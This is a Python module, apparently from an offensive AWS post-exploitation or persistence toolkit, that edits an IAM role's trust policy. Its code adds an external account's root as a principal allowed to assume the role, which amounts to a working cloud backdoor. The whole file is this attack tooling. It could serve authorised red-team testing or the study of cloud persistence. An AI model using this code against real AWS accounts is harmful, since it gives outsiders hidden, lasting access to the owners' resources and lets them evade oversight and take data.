import argparse
import boto3
import json

from .DoorModule import DoorModule

class TrustPolicy(DoorModule):
    class Meta:
        name = 'AWS Trust Policy'
        help = 'Modify the trust policy of a role to assume it from somwhere else'

    def __init__(self, argv:list[str]):
        # TODO : Add a flag to create a new role and associate the policy during creation
        #        it allows to only use CreateRole privs instead of UpdateRole privs
        parser = argparse.ArgumentParser(formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument(
            '-r',
            '--role',
            help='The role to modify',
            required=True
        )
        parser.add_argument(
            '-a',
            '--account',
            help='The remote account to add',
            required=True
        )
        parser.add_argument(
            '-s',
            '--statement',
            help='The statement SID to modify',
            default=None,
            required=False
        )
        parser.add_argument(
            '-c',
            '--create',
            help='Create a new ALLOW statement with the name given as parameter',
            default=None,
            required=False
        )

        args, _ = parser.parse_known_args(argv)
        self.role = args.role
        self.account = args.account
        self.statement = args.statement
        self.create = args.create

    def run(self):
        iam = boto3.client('iam')
        response = iam.get_role(RoleName=self.role)
        trust_policy = response['Role']['AssumeRolePolicyDocument']
        print("[-] Initial trust policy:")
        print(json.dumps(trust_policy, indent=2))
        if self.create is not None:
            statement = f'''
            {{
                "Sid": "{self.create}",
                "Effect": "Allow",
                "Principal": {{
                    "AWS": [
                        "arn:aws:iam::{self.account}:root"
                    ]
                }},
                "Action": "sts:AssumeRole"
            }}
            '''
            trust_policy['Statement'].append(json.loads(statement))
        else:
            if type(trust_policy['Statement']) != list:
                trust_policy['Statement'] = [trust_policy['Statement']]
            for statement in trust_policy['Statement']:
                if (self.statement is None and statement['Effect'] == 'Allow') or (self.statement is not None and statement['Sid'] == self.statement):
                    try:
                        arns = statement['Principal']['AWS']
                    except KeyError:
                        arns = []
                    if type(arns) is str:
                        arns = [arns]
                    arns.append(f'arn:aws:iam::{self.account}:root')
                    statement['Principal']['AWS'] = arns
                    break
        print("[+] New trust policy:")
        print(json.dumps(trust_policy, indent=2))
        confirm = input("\n[+] Do you want to apply this change? (yes/no): ").strip().lower()
        if confirm.lower() not in ("yes", "y"):
            print('[-] Aborting changes, the policy has not been updated')
            return
        try:
            iam.update_assume_role_policy(
                RoleName=self.role,
                PolicyDocument=json.dumps(trust_policy)
            )
            print(f'[+] Trust policy for {self.role} updated')
        except Exception as e:
            print(f"[x] Failed to update trust policy: {e}")
